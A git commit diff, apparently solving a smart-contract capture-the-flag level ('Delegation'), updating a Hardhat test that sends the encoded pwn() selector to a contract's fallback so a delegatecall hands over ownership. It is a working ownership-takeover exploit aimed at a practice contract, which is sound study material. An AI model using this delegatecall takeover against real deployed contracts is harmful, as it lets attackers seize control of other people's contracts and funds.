5b58d9ebf7ccb1fdccccfbc945710300b1d746cd
bekauz <bekauz@protonmail.com>
2022-03-04 18:32:06 +0100

    level 6 solution

--- test/06_Delegation/06-delegation.ts
+++ test/06_Delegation/06-delegation.ts
@@ -1,8 +1,8 @@
 import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
 import { expect } from "chai";
-import { Contract } from "ethers";
+import { BigNumber, Contract } from "ethers";
+import { Interface } from "ethers/lib/utils";
 import { ethers } from "hardhat";
-import { Delegate } from "../../typechain/Delegate";
 import { getNewInstance, submitInstance } from "../utils";
 
 const LEVEL_ADDRESS = "0x9451961b7Aea1Df57bc20CC68D72f662241b5493";
@@ -20,26 +20,25 @@ describe.only("Delegation", () => {
         const delegationContractFactory = await ethers.getContractFactory("Delegation");
         const challengeAddr = await getNewInstance(LEVEL_ADDRESS);
         contract = await delegationContractFactory.attach(challengeAddr);
-
     });
 
     it("Should solve the challenge", async function () {
         
         expect(await submitInstance(contract.address)).to.be.false;
-        expect(await contract.owner()).to.not.equal(owner.address);
 
-        const iAbi = new ethers.utils.Interface(["function pwn()"]);
+        const iAbi: Interface = new ethers.utils.Interface(["function pwn()"]);
+        const encodedData: string = iAbi.encodeFunctionData("pwn");
 
-        // TODO: call pwn() method 
+        // sends the pwn() method id as msg.data to the fallback of Delegation contract
+        // which then in turn delegatecalls the Delegate contract and claims ownership
         const delegateFallbackTxn: any = {
             to: contract.address,
-            data: iAbi.encodeFunctionData("pwn"),
+            data: encodedData,
+            gasLimit: BigNumber.from("50000")
         };
         txn = await owner.sendTransaction(delegateFallbackTxn);
         await txn.wait();
 
-
         expect(await submitInstance(contract.address), "level is not complete").to.be.true;
-        expect(await contract.owner()).to.equal(owner.address);
     });
 });
